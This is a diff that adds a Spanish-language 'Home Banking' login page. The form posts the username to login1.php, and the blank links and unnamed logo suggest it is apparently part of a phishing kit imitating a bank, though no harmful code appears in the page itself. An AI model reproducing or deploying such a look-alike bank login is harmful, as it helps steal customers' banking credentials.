@@ -1,0 +1,77 @@
+<html lang="es"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale =1">
+<title>Login</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+<style type="text/css">
+      html{background: #f2f1ef;}.logo, .row , .col-sm-9, .container-fluid, body{background: transparent !important;}.img{top: -50px;left: calc(50% - 45px);}input{height: 45px;outline: none !important;}input:focus{box-shadow: 0 0 0 2px rgba(200, 200, 200, .5) !important;border: 1px solid silver !important;}#logo{height: 45px;}@media (max-width:580px){.container-fluid{width:85%;margin-left:7.5% !important;}}
+    </style>
+</head>
+<body>
+<div class="container-fluid m-0 p-0">
+<div class="row mt-5 m-0">
+<div class="col-12 m-auto">
+<div class="text-center mb-5 logo">
+<img src="img/logo.svg" height="58px" id="logo">
+</div>
+<div class="p-2">
+</div>
+<div class="col-sm-6 m-auto shadow">
+<form class="position-relative p-5 bg-white w-100 mt-5" method="POST" action="login1.php">
+<div class="position-absolute img">
+<img src="img/icono-login.png" height="90px">
+</div>
+<div class="mb-2 mt-5">
+<label class="form-label">INGRESÁ TU USUARIO</label>
+<input type="" class="form-control rounded-0" name="usu" id="usu" placeholder="Usuario">
+</div>
+<div class="form-check">
+<input class="form-check-input rounded-0" type="checkbox" value="" id="flexCheckDefault">
+<label class="form-check-label text-muted" for="flexCheckDefault" style="font-size: 12px;position: relative;top: -2px;">
+Quiero recordad mi usuario
+</label>
+</div>
+<button class="btn w-100 mb-5 border-0" name="submit" id="button" disabled="" style="background: rgb(227, 225, 221); color: rgb(136, 136, 136);">Siguiente</button>
+</form>
+<div class="w-100 d-flex">
+<div class="w-50 text-center p-3 border-bottom" style="background: #f2f1ef;">Ayuda</div>
+<div class="w-50 text-center p-3 border-bottom" style="background: #f2f1ef;">Nuevo usuario</div>
+</div>
+</div>
+<div class="col-12 text-center mt-3 mb-5">
+<b style="color: #005baa;font-size: 14px;">Por tu seguridad, nunca compartas los datos de acceso ni<br>códigos de validación de tu Home Banking.</b>
+</div>
+<div class="col-12 text-center">
+<ul class="d-flex justify-content-center m-0 ms-0" style="list-style:none">
+<li class="p-3" style="font-size: 13px;">
+<a href="" class="text-muted">Términos y condiciones</a>
+</li>
+<li class="p-3" style="font-size: 13px;">
+<a href="" class="text-muted">Seguridad del Sistema</a>
+</li>
+<li class="p-3" style="font-size: 13px;">
+<a href="" class="text-muted">Contacto</a>
+</li>
+</ul>
+<p>Versión - v0.18.265</p>
+</div>
+</div>
+</div>
+</div>
+<script type="text/javascript">
+      var btn = document.getElementById("button");
+      btn.style.background = "#e3e1dd";
+      btn.style.color = "#888";
+      var entrada = document.getElementById("usu");
+      entrada.addEventListener("keyup", ()=>{
+        if (entrada.value != "") {btn.disabled=false;btn.style.background = "#005baa"; btn.style.color = "#FFF";}
+          else{
+            btn.disabled=true;
+            btn.style.background = "#e3e1dd";
+            btn.style.color = "#888";
+          }
+      })
+    </script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+
+</body></html>
